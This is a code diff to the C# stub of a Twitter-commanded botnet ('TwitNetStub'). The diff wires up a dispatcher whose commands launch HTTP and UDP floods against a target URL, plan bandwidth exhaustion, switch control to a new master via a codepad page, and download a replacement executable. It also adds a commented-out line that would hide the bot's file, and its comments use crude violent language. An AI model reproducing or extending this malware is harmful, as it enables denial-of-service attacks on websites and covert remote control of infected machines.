@@ -3,6 +3,7 @@
  * - Way more operations
  */
 
+using System;
 using System.Text;
 using System.IO;
 using System.Net;
@@ -36,6 +37,7 @@ namespace TwitNetStub
 
         public void Start()
         {
+            //File.SetAttributes(Constants.FileName, FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed);
             //Grab file contents
             byte[] stub = File.ReadAllBytes(Application.ExecutablePath);
 
@@ -75,8 +77,17 @@ namespace TwitNetStub
 
             //these will throw a null pointed if you dont do <command> at <argument>
             //even if there are no arguments. ill fix it later...
-            command = Strings.Split(tweet, Constants.CommandSplitter)[0];
-            arg = Strings.Split(tweet, Constants.CommandSplitter)[1];
+            try
+            {
+                command = Strings.Split(tweet, Constants.CommandSplitter)[0];
+                arg = Strings.Split(tweet, Constants.CommandSplitter)[1];
+            }
+            catch (Exception)
+            {
+                command = "null";
+                arg = "null";
+            }
+            
 
             if (command == Variables.LastTweet)
                 command = "null";//so it goes to default & doesn't loop on the same command
@@ -85,31 +96,41 @@ namespace TwitNetStub
             switch (command.ToLower())
             {
                 case "httpflood":
+                    //httpflood at URL
                     op = new HTTPFloodOP(arg);
                     break;
                 case "udpflood":
+                    //udpflood at URL
                     op = new UDPFloodOP(arg);
                     break;
                 case "bwrape":
+                    //bwrape at URL
                     //mass downloads a file to rape bandwidth on a website
                     //something like a large image.
                     //Arguments: URL
                     break;
                 case "switch":
+                    //switch at codepad_page
                     op = new SwitchMasterOP(arg);
                     break;
                 case "choniboi":
+                    //choniboi at <anything>
                     op = new ReleaseBotOP();
+                    //Arguments: None
                     break;
                 case "visit":
+                    //visit at URL
                     //will visit a website once for traffic reasons
                     //Arguments: URL, Maybe an integer for how many visits
                     break;
                 case "update":
-                    //Will download an executable and run it
+                    //update at URL
+                    op = new UpdateBotOP(arg);
+                    //Will make the bot replace itself with a newer version
                     //Arguments: URL
                     break;
                 case "thanks":
+                    //thanks at <anything>
                     //By leaving this blank, the bot will go see "thanks"
                     //and stop whatever its doing. Any time you start an operation
                     //you will need to end it by saying "thanks"
@@ -123,9 +144,11 @@ namespace TwitNetStub
                     //If the command cant be identified, well then shit son.
                     return;
             }
-            if (op == null) return;
-            op.Initialize();
-            op.Run();
+            if (op != null)
+            {
+                op.Initialize();
+                op.Run();
+            }
 
             Variables.LastTweet = tweet;
             Thread.Sleep(300000);
